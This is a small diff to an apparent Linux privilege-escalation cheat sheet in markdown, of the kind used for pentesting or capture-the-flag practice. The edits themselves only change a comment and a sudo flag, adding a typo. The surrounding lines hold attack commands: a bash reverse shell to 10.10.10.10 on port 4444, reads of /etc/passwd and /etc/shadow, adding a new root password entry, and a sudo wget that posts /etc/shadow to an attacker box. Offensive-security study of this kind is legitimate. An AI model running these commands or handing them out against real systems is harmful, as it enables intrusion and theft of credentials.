@@ -94,7 +94,7 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 cat /etc/passwd | cut -d: -f1 | awk -F: '($3 == "0") {print}' /etc/passwd
 ls -la /etc/shadow | cat /etc/shadow
 ```
-#### probably better in persistence/backdoor areas as this seems rare writable /etc/passwd
+**EDIT NOTE **probably better in persistence/backdoor areas as this seems rare writable /etc/passwd
 
 ```bash
 openssl passwd newpasswordhere # Add a new root for passwd
@@ -123,7 +123,7 @@ ssh -i _id_rsa [id]@[ip]
 ### Sudo -flags
 #### sudo -l
 ```bash
-sudo -l -l # extra -l to check without password prompting
+sudo -l # chedck usage
 sudo /usr/bin/wget --post-file=/etc/shadow http//attackbox:port # Sudo -l but no password NO problem!
 ```
 #### sudo -u to abuse file permission to call sudo through unsafe variable input, handling
